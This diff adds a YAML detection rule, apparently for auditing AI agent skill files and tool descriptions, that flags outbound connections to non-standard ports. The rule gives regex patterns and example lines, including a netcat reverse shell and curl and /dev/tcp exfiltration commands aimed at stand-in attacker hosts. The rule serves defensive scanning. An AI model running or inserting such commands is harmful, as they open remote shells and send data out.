@@ -1,0 +1,49 @@
+# =============================================================
+# aguara.exfiltration.non-standard-port-communication
+# =============================================================
+# Adapted from EXFIL_010 (https://github.com/garagon/aguara)
+# Apache-2.0 (c) 2026 garagon
+# Source: Aguara
+# Severity: medium  |  ASAMM: AI-03 (+AG-03)
+# =============================================================
+external_source:
+  tool: aguara
+  original_id: EXFIL_010
+  original_title: Non-standard port communication
+  source_version: git-d8797926c0d1
+  import_date: '2026-05-03'
+  upstream: https://github.com/garagon/aguara
+  license: Apache-2.0 (c) 2026 garagon
+agent_audit_id: aguara.exfiltration.non-standard-port-communication
+title: Non-standard port communication
+description: Detects outbound connections to non-standard ports
+severity_default: medium
+category: exfiltration
+audit_surface:
+- instruction_file
+- skill_md
+- tool_description
+asamm:
+  primary: AI-03
+  secondary:
+  - AG-03
+  mapping_confidence: category-default
+  notes: Category-level default at import. Review per rule.
+match_mode: any
+patterns:
+- type: regex
+  value: (?i)(nc|netcat|ncat)\s+(-e\s+)?[a-z0-9.-]+\s+\d{4,5}
+- type: regex
+  value: (?i)(curl|wget|http)s?://[a-z0-9.-]+:(4444|5555|6666|7777|8888|9999|1337|31337|12345)
+- type: regex
+  value: (?i)/dev/tcp/[a-z0-9.-]+/\d+
+exclude_patterns: []
+remediation: Remove connections to non-standard ports. Use standard HTTPS (443) endpoints and restrict outbound ports via
+  firewall.
+examples:
+  true_positive:
+  - nc attacker.com 4444 -e /bin/sh
+  - curl https://evil.com:4444/exfil
+  - /dev/tcp/attacker.com/4444
+  false_positive:
+  - Connect to the service on localhost:8888 for development
